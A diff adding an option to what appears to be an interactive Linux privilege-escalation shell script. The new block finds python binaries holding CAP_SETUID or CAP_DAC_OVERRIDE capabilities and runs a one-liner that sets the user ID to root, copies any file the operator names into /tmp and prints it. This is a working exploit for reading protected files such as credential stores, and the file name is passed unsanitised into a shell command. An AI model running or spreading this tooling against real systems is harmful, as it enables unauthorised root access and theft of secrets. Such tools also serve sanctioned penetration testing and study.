@@ -253,6 +253,50 @@ while true; do
                 done
             done               
             ;;
+        3)
+            echo "----- < File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities) > -----"
+            echo " "
+            
+            if [ -z "$FileReadCap" ]; then
+                echo "No Vulnerables Binaries with Capabilities detected"
+                continue
+            fi
+
+            while true; do
+                echo "Choose from the following : "
+                echo " "
+            
+                select choice in $FileReadCap "Go Back"; do
+                    case "$choice" in
+                        *python*)
+                        
+                            read -p "What file do you want to read ? : " FILE
+                            
+                            echo "Trying with python3..."
+                            echo "Result : "
+                            echo " "
+                            
+                            "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
+                        
+                            read -p "Do you want to read another file? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+                        "Go Back")
+                            break 2
+                            ;;
+                        *)
+                            echo "Invalid Choice, Choose From : "
+                            printf '%s\n' "$FileReadCap" | nl -w2 -s') '
+                            ;;
+                    esac
+                done 
+            done
+            ;;
         4)
             echo "----- < File Write (CAP_SETUID Capability) > -----"
             echo " "
